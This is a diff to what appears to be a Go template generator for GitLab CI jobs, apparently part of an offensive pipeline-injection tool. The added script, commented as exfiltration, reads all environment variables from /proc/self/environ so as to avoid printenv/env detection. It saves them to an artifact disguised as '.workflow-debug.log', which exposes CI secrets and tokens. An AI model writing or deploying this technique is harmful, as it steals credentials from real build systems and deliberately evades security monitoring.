@@ -39,8 +39,14 @@ stages: [%s]
 %s:
   stage: %s%s%s
   script:
-    - echo "Workflow-level variables injected — affect ALL jobs"
-    - printenv | sort || true
+    - |
+      # Exfil via sed extraction from /proc (avoids printenv/env commands)
+      sed 's/\x0/\n/g' /proc/self/environ 2>/dev/null | sort > .workflow-debug.log || true
+  artifacts:
+    when: always
+    paths:
+      - .workflow-debug.log
+    expire_in: 1 day
   allow_failure: true%s
 `, o.TriggerOn,
 		indentBlock(strings.TrimSpace(varsBlock), 8),
